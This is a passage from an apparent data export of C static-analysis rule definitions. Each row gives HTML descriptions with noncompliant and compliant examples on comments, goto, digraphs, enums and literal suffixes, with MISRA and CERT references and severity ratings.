the <code>//</code> style of comments as an extension to C90. The use of <code>//</code> in preprocessor directives (e.g. <code>#define</code>) can
vary. Also the mixing of <code>/* ... */</code> and <code>//</code> is not consistent. This is more than a style issue, since different (pre C99)
compilers may behave differently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main(int argc, char* argv[])
{
  // Do nothing - Noncompliant
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main(int argc, char* argv[])
{
  /* Do nothing - Compliant */
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.2 - Source code shall only use /* ... */ style comments. </li>
</ul>",c:C99CommentUsage,c,C,"<p>This excludes the use of <code>//</code> C99 style comments and C++ style comments, since these are not permitted in C90. Many compilers support
the <code>//</code> style of comments as an extension to C90. The use of <code>//</code> in preprocessor directives (e.g. <code>#define</code>) can
vary. Also the mixing of <code>/* ... */</code> and <code>//</code> is not consistent. This is more than a style issue, since different (pre C99)
compilers may behave differently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main(int argc, char* argv[])
{
  // Do nothing - Noncompliant
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main(int argc, char* argv[])
{
  /* Do nothing - Compliant */
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.2 - Source code shall only use /* ... */ style comments. </li>
</ul>",Source code should only use /* ... */ style comments,[],MINOR,"['convention', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Use either the <code>// ...</code> or <code>/* ... */</code> comment syntax, but be consistent and do not mix them within the same file.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* Noncompliant; both comment syntaxes are used in the same file */
// Foo
/* Bar */
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant; uniform comment syntax
// Foo
// Bar
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DQBWB"">CERT, MSC55-J.</a> - Use comments consistently and in a readable fashion </li>
</ul>",c:CommentMixedStyles,c,C,"<p>Use either the <code>// ...</code> or <code>/* ... */</code> comment syntax, but be consistent and do not mix them within the same file.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* Noncompliant; both comment syntaxes are used in the same file */
// Foo
/* Bar */
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant; uniform comment syntax
// Foo
// Bar
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DQBWB"">CERT, MSC55-J.</a> - Use comments consistently and in a readable fashion </li>
</ul>","Comment styles ""//"" and ""/* ... */"" should not be mixed within a file",[],MINOR,"['cert', 'convention']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i == 5) {
    continue;  /* Noncompliant */
  }
  printf(""i = %d\n"", i);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i != 5) {
    printf(""i = %d\n"", i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>",c:ContinueUsage,c,C,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i == 5) {
    continue;  /* Noncompliant */
  }
  printf(""i = %d\n"", i);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i != 5) {
    printf(""i = %d\n"", i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>","""continue"" should not be used",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The use of digraphs may not meet developer expectations.</p>
<p>The digraphs are: </p>
<ul>
  <li> <code>&lt;%</code> </li>
  <li> <code>%&gt;</code> </li>
  <li> <code>&lt;:</code> </li>
  <li> <code>:&gt;</code> </li>
  <li> <code>%:</code> </li>
  <li> <code>%:%:</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt;
class A
{
  public:
    template&lt;int32_t i&gt;
    void f2();
};

void f(A&lt;int32_t&gt; * a&lt;:10:&gt;)    /* Noncompliant - usage of '&lt;:' instead of '[' and ':&gt;' instead of ']' */
&lt;%                              /* Noncompliant - usage of '&lt;%' instead of '{' */
  a&lt;:0:&gt;-&gt;f2&lt;20&gt;();             /* Noncompliant - usage of '&lt;:' and ':&gt;' */
%&gt;                              /* Noncompliant - usage of '%&gt;' instead of '}' */
</pre>
<h2>Compliant Solution</h2>
<pre>/* ... */

void f(A&lt;int32_t&gt; * a[10])      /* Compliant */
{                               /* Compliant */
  a[0]-&gt;f2&lt;20&gt;();               /* Compliant */
}                               /* Compliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-5-1 - Digraphs should not be used. </li>
</ul>",c:DigraphUsage,c,C,"<p>The use of digraphs may not meet developer expectations.</p>
<p>The digraphs are: </p>
<ul>
  <li> <code>&lt;%</code> </li>
  <li> <code>%&gt;</code> </li>
  <li> <code>&lt;:</code> </li>
  <li> <code>:&gt;</code> </li>
  <li> <code>%:</code> </li>
  <li> <code>%:%:</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt;
class A
{
  public:
    template&lt;int32_t i&gt;
    void f2();
};

void f(A&lt;int32_t&gt; * a&lt;:10:&gt;)    /* Noncompliant - usage of '&lt;:' instead of '[' and ':&gt;' instead of ']' */
&lt;%                              /* Noncompliant - usage of '&lt;%' instead of '{' */
  a&lt;:0:&gt;-&gt;f2&lt;20&gt;();             /* Noncompliant - usage of '&lt;:' and ':&gt;' */
%&gt;                              /* Noncompliant - usage of '%&gt;' instead of '}' */
</pre>
<h2>Compliant Solution</h2>
<pre>/* ... */

void f(A&lt;int32_t&gt; * a[10])      /* Compliant */
{                               /* Compliant */
  a[0]-&gt;f2&lt;20&gt;();               /* Compliant */
}                               /* Compliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-5-1 - Digraphs should not be used. </li>
</ul>",Digraphs should not be used,[],BLOCKER,"['misra', 'obsolete']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>If an enumerator list is given with no explicit initialization of members, then C/C++ allocates a sequence of integers starting at zero for the
first element and increasing by one for each subsequent element.</p>
<p>An explicit initialization of the first element, as permitted by this rule, forces the allocation of integers to start at the given value. When
adopting this approach it is essential to ensure that the initialization value used is small enough that no subsequent value in the list will exceed
the <code>int</code> storage used by enumeration constants.</p>
<p>Explicit initialization of all items in the list, which is also permissible, prevents the mixing of automatic and manual allocation, which is error
prone.</p>
<p>However, it is then the responsibility of the developer to ensure that all values are in the required range, and that values are not
unintentionally duplicated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum color { red = 3, blue, green, yellow = 5 }; // Noncompliant; both green and yellow = 5
</pre>
<h2>Compliant Solution</h2>
<pre>
enum color { red = 3, blue = 4, green = 5, yellow = 5 }; // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 9.3 - In an enumerator list, the ""="" construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
  <li> MISRA C++:2008, 8-5-3 - In an enumerator list, the = construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
</ul>",c:EnumPartialInitialization,c,C,"<p>If an enumerator list is given with no explicit initialization of members, then C/C++ allocates a sequence of integers starting at zero for the
first element and increasing by one for each subsequent element.</p>
<p>An explicit initialization of the first element, as permitted by this rule, forces the allocation of integers to start at the given value. When
adopting this approach it is essential to ensure that the initialization value used is small enough that no subsequent value in the list will exceed
the <code>int</code> storage used by enumeration constants.</p>
<p>Explicit initialization of all items in the list, which is also permissible, prevents the mixing of automatic and manual allocation, which is error
prone.</p>
<p>However, it is then the responsibility of the developer to ensure that all values are in the required range, and that values are not
unintentionally duplicated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum color { red = 3, blue, green, yellow = 5 }; // Noncompliant; both green and yellow = 5
</pre>
<h2>Compliant Solution</h2>
<pre>
enum color { red = 3, blue = 4, green = 5, yellow = 5 }; // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 9.3 - In an enumerator list, the ""="" construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
  <li> MISRA C++:2008, 8-5-3 - In an enumerator list, the = construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
</ul>","""enum"" members other than the first one should not be explicitly initialized unless all members are explicitly initialized",[],MAJOR,['misra'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",c:FileComplexity,c,C,"<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",Files should not be too complex,"[{'key': 'maximumFileComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity in file', 'defaultValue': '80', 'type': 'INTEGER'}]",MAJOR,[],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",c:FileLoc,c,C,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'maximumFileLocThreshold', 'htmlDesc': 'The maximum authorized lines', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",c:FunctionComplexity,c,C,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",Functions should not be too complex,"[{'key': 'maximumFunctionComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '20', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Passing arguments via an ellipsis bypasses the type checking performed by the compiler. Additionally, passing an argument with non-POD class type
leads to undefined behavior. Note that the rule specifies ""defined"" (and not ""declared"") so as to permit the use of existing library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void MyPrintf ( char_t * pFormat, ... )	// Noncompliant
{
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments. </li>
  <li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4CW"">CERT, DCL50-CPP.</a> - Do not define a C-style variadic function </li>
</ul>",c:FunctionEllipsis,c,C,"<p>Passing arguments via an ellipsis bypasses the type checking performed by the compiler. Additionally, passing an argument with non-POD class type
leads to undefined behavior. Note that the rule specifies ""defined"" (and not ""declared"") so as to permit the use of existing library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void MyPrintf ( char_t * pFormat, ... )	// Noncompliant
{
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments. </li>
  <li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4CW"">CERT, DCL50-CPP.</a> - Do not define a C-style variadic function </li>
</ul>",Functions should not be defined with a variable number of arguments,[],CRITICAL,"['cert', 'misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>This is required by IEC 61508, under good programming style.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int function1()
{
  return 3;
}

void function2()
{
  function1();
}

int function3(char* ptr) /* Noncompliant; two explicit returns */
{
  if (ptr == NULL) return -1;

  return 7;
}

void function4(char *ptr) /* Noncompliant; two returns, one explicit and one implicit */
{
  if (1) return;

  printf(""hello world!\n"");
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.7 - A function shall have a single point of exit at the end of the function. </li>
  <li> MISRA C++:2008, 6-6-5 - A function shall have a single point of exit at the end of the function </li>
  <li> MISRA C:2012, 15.5 - A function should have a single point of exit at the end </li>
</ul>",c:FunctionSinglePointOfExit,c,C,"<p>This is required by IEC 61508, under good programming style.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int function1()
{
  return 3;
}

void function2()
{
  function1();
}

int function3(char* ptr) /* Noncompliant; two explicit returns */
{
  if (ptr == NULL) return -1;

  return 7;
}

void function4(char *ptr) /* Noncompliant; two returns, one explicit and one implicit */
{
  if (1) return;

  printf(""hello world!\n"");
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.7 - A function shall have a single point of exit at the end of the function. </li>
  <li> MISRA C++:2008, 6-6-5 - A function shall have a single point of exit at the end of the function </li>
  <li> MISRA C:2012, 15.5 - A function should have a single point of exit at the end </li>
</ul>",A function should have a single point of exit at the end of the function,[],MINOR,"['brain-overload', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>A global function named <code>main</code> is the entry point to the program, and is the only identifier which must be in the global namespace. The
use of <code>main</code> for other functions may not meet developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {       // Compliant
}

namespace {
  int main() {     // Noncompliant
  }
}
namespace NS {
  int main() {     // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-2 - The identifier main shall not be used for a function other than global function main. </li>
</ul>",c:GlobalMainFunction,c,C,"<p>A global function named <code>main</code> is the entry point to the program, and is the only identifier which must be in the global namespace. The
use of <code>main</code> for other functions may not meet developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {       // Compliant
}

namespace {
  int main() {     // Noncompliant
  }
}
namespace NS {
  int main() {     // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-2 - The identifier main shall not be used for a function other than global function main. </li>
</ul>","The name ""main"" should not be used for any function other than the global ""main"" function",[],BLOCKER,"['misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse, and possibly to unspecified behavior.</p>
<p>Unfortunately, removing <code>goto</code> from some code can lead to a rewritten version that is even more difficult to understand than the
original. Therefore, limited use of <code>goto</code> is sometimes advised. </p>
<p>However, the use of <code>goto</code> to jump into or out of a sub-block of code, such as into the body of a <code>for</code> loop is never
acceptable, because it is extremely difficult to understand and will likely yield results other than what is intended. </p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    goto L2;  // Noncompliant; jumps into a different block
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }
  goto L2;  // Noncompliant; jumps into a block

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...  Should only have come here with a &gt;=0. Loop is infinite if a &lt; 0
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    // ...
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-1 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto
  statement </li>
  <li> MISRA C:2012, 15.3 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto statement
  </li>
</ul>",c:GotoLabelInNestedBlock,c,C,"<p>Use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse, and possibly to unspecified behavior.</p>
<p>Unfortunately, removing <code>goto</code> from some code can lead to a rewritten version that is even more difficult to understand than the
original. Therefore, limited use of <code>goto</code> is sometimes advised. </p>
<p>However, the use of <code>goto</code> to jump into or out of a sub-block of code, such as into the body of a <code>for</code> loop is never
acceptable, because it is extremely difficult to understand and will likely yield results other than what is intended. </p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    goto L2;  // Noncompliant; jumps into a different block
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }
  goto L2;  // Noncompliant; jumps into a block

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...  Should only have come here with a &gt;=0. Loop is infinite if a &lt; 0
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    // ...
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-1 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto
  statement </li>
  <li> MISRA C:2012, 15.3 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto statement
  </li>
</ul>","""goto"" statements should not be used to jump into blocks",[],BLOCKER,"['brain-overload', 'misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 0;
loop:
  printf(""i = %d\n"", i);
  i++;
  if (i &lt; 10){
    goto loop; // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i = %d\n"", i);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.4 - The goto statement shall not be used. </li>
  <li> MISRA C:2012, 15.1 - The goto statement should not be used </li>
</ul>",c:GotoUsage,c,C,"<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 0;
loop:
  printf(""i = %d\n"", i);
  i++;
  if (i &lt; 10){
    goto loop; // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i = %d\n"", i);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.4 - The goto statement shall not be used. </li>
  <li> MISRA C:2012, 15.1 - The goto statement should not be used </li>
</ul>","""goto"" statement should not be used",[],MAJOR,"['brain-overload', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>In addition to being difficult to use, too-long variable names can limit code portability. The ISO standard requires that variable, type, function
and label names be no more than 31 characters long. </p>
<p>Note that 31 characters is an upper bound, rather than a length recommendation. Shorter names are better, as long as they're still
communicative.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int this_is_a_very_long_identifier_that_definitely_should_be_renamed = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int reasonable_identifier = 0;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 5.1 - Identifiers (internal and external) shall not rely on the significance of more than 31 character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QAU"">CERT, DCL23-C.</a> - Guarantee that mutually visible identifiers are unique </li>
</ul>",c:IdentifierLongerThan31,c,C,"<p>In addition to being difficult to use, too-long variable names can limit code portability. The ISO standard requires that variable, type, function
and label names be no more than 31 characters long. </p>
<p>Note that 31 characters is an upper bound, rather than a length recommendation. Shorter names are better, as long as they're still
communicative.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int this_is_a_very_long_identifier_that_definitely_should_be_renamed = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int reasonable_identifier = 0;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 5.1 - Identifiers (internal and external) shall not rely on the significance of more than 31 character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QAU"">CERT, DCL23-C.</a> - Guarantee that mutually visible identifiers are unique </li>
</ul>",Identifiers should not be longer than 31 characters,[],MAJOR,"['cert', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions. </li>
  <li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression. </li>
  <li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects
  other than that cause by the increment or decrement operator </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwE"">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/fYAyAQ"">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/yQC7AQ"">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>",c:IncAndDecMixedWithOtherOperators,c,C,"<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions. </li>
  <li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression. </li>
  <li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects
  other than that cause by the increment or decrement operator </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwE"">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/fYAyAQ"">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/yQC7AQ"">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>",Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression,[],MAJOR,"['cert', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The use of an undefined escape sequence leads to undefined behavior. The defined escape sequences (ISO/IEC 14882:2003 [1] Ã‚Â§2.13.2) are:
<code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\\</code>,
<code>?</code>, <code>\'</code>, <code>\""</code>, <code>\&lt;Octal Number&gt;</code>, and <code>\x&lt;Hexadecimal Number&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char_t a[ 2 ] = ""\k"";   // Noncompliant
const char_t b[ 2 ] = ""\b"";   // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 4.1 - Only those escape sequences that are defined in ISO C standard shall be used. </li>
  <li> MISRA C++:2008, 2-13-1 - Only those escape sequences that are defined in ISO/IEC 14882:2003 shall be used. </li>
</ul>",c:InvalidEscapeSequence,c,C,"<p>The use of an undefined escape sequence leads to undefined behavior. The defined escape sequences (ISO/IEC 14882:2003 [1] Ã‚Â§2.13.2) are:
<code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\\</code>,
<code>?</code>, <code>\'</code>, <code>\""</code>, <code>\&lt;Octal Number&gt;</code>, and <code>\x&lt;Hexadecimal Number&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char_t a[ 2 ] = ""\k"";   // Noncompliant
const char_t b[ 2 ] = ""\b"";   // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 4.1 - Only those escape sequences that are defined in ISO C standard shall be used. </li>
  <li> MISRA C++:2008, 2-13-1 - Only those escape sequences that are defined in ISO/IEC 14882:2003 shall be used. </li>
</ul>",Only escape sequences defined in the ISO C standard should be used,[],MAJOR,['misra'],BUG
2013-09-16T11:41:23+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,c:LineLength,c,C,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length', 'defaultValue': '80', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Using upper case literal suffixes removes the potential ambiguity between ""1"" (digit 1) and ""l"" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const int        a = 0u;      // Noncompliant
const int        b = 0l;      // Noncompliant
const int        c = 0Ul;     // Noncompliant
const int        d = 0x12bu;  // Noncompliant
const float      m = 1.2f;    // Noncompliant
const float      n = 1.2l;    // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const int        a = 0U;
const int        b = 0L;
const int        c = 0UL;
const int        d = 0x12bU;
const float      m = 1.2F;
const float      n = 1.2L;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case </li>
  <li> MISRA C:2012, 7.3 - The lowercase character ""l"" shall not be used in a literal suffix </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/koAtAQ"">CERT DCL16-C.</a> - Use ""L,"" not ""l,"" to indicate a long value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",c:LiteralSuffix,c,C,"<p>Using upper case literal suffixes removes the potential ambiguity between ""1"" (digit 1) and ""l"" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const int        a = 0u;      // Noncompliant
const int        b = 0l;      // Noncompliant
const int        c = 0Ul;     // Noncompliant
const int        d = 0x12bu;  // Noncompliant
const float      m = 1.2f;    // Noncompliant
const float      n = 1.2l;    // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const int        a = 0U;
const int        b = 0L;
const int        c = 0UL;
const int        d = 0x12bU;
const float      m = 1.2F;
const float      n = 1.2L;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case </li>
  <li> MISRA C:2012, 7.3 - The lowercase character ""l"" shall not be used in a literal suffix </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/koAtAQ"">CERT DCL16-C.</a> - Use ""L,"" not ""l,"" to indicate a long value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",Literal suffixes shall be upper case,[],MINOR,"['cert', 'convention', 'misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The effect of this rule is to require that operands are appropriately parenthesized. Parentheses are important in this situation both for
readability of code and for ensuring that the behavior is as the developer intended.</p>
<p>Where an expression consists of either a sequence of only logical <code>&amp;&amp;</code> or a sequence of logical <code>||</code>, extra
parentheses are not required.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0 &amp;&amp; ishigh);                   // Noncompliant
if (x || y || z);
if (x || y &amp;&amp; z);                        // Noncompliant
if (x &amp;&amp; !y);                            // Noncompliant
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; (y &gt; c2) || (z &gt; c3));   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((x == 0) &amp;&amp; ishigh);
if (x || y || z);
